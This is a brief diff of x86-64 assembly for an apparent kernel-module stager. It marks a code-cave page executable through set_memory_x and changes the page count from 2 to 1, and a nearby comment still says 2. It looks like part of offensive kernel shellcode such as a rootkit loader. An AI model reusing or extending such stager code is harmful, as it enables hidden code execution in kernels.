@@ -47,7 +47,7 @@ lkm_stager:
 
     and     rdi, -4096                  ; 48 81 E7 00 F0 FF FF  [7]  page-align
 
-    push    2                           ; 6A 01       [2]  arg2: nrpages = 2
+    push    1                           ; 6A 01       [2]  arg2: nrpages = 1
     pop     rsi                         ; 5E          [1]
 
     ; Call set_memory_x(loader_cave_page, 2) — direct rel32.
